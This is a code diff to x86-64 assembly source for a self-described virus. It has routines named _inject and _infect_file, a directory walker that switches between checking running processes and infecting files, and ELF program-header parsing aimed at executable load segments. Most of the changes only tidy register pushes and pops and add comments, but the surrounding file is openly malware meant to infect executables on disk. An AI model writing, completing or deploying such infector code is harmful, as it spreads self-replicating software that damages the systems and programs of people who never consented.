@@ -26,13 +26,8 @@ _start:
 newline db `\n`, 0x0
 
 _print:; (string rdi)
-	push r8
-	push r9
-	push r11
 	push rdx
-	push rbx
 	push rsi
-	push rcx
 
 	call _ft_strlen; ft_strlen(rdi)
 	push rdi; mov rsi, rdi
@@ -46,23 +41,16 @@ _print:; (string rdi)
 	syscall
 
 	push rsi
-	pop rbx
 	lea rsi, [rel newline]
 	push 1
 	pop rax; write
 	push 1
 	pop rdx
 	syscall
-	push rbx
 	pop rdi
 
-	pop rcx
 	pop rsi
-	pop rbx
 	pop rdx
-	pop r11
-	pop r9
-	pop r8
 ret
 
 %endif; ========================================================================
@@ -70,7 +58,7 @@ ret
 _inject:
 	lea rdi, [rel process_dir]
 	push 1
-	pop rsi
+	pop rsi ; mode for move_through_dir
 	call _move_through_dir
 	cmp rax, 0x0
 	jne _end
@@ -94,7 +82,7 @@ _inject:
 		pop r9
 	; r9 contains the end of the virus (minus params)
 
-	xor rsi, rsi
+	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
 	.loop_array_string:
@@ -247,7 +235,8 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 			.process_dir:
 				push rdi
-				mov rdi, rbx
+				push rbx
+				pop rdi
 				call _ft_isnum
 				pop rdi
 				cmp rax, 0x0
@@ -387,7 +376,6 @@ _infect_file: ; (string rdi, stat rsi)
 
 	.is_elf_file:
 		; TODO: do 32 bits version (new compilation ?)
-
 
 		; get pt_load exec
 		mov ax, [r13 + 56]; e_phnum
@@ -648,12 +636,12 @@ _ft_strlen:; (string rdi)
 		cmp byte [rdi + rcx], 0
 		jz .return
 		inc rcx
-		jmp .loop_char
+	jmp .loop_char
 	.return:
 		push rcx
 		pop rax
 
-		pop rcx
+	pop rcx
 ret
 
 _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
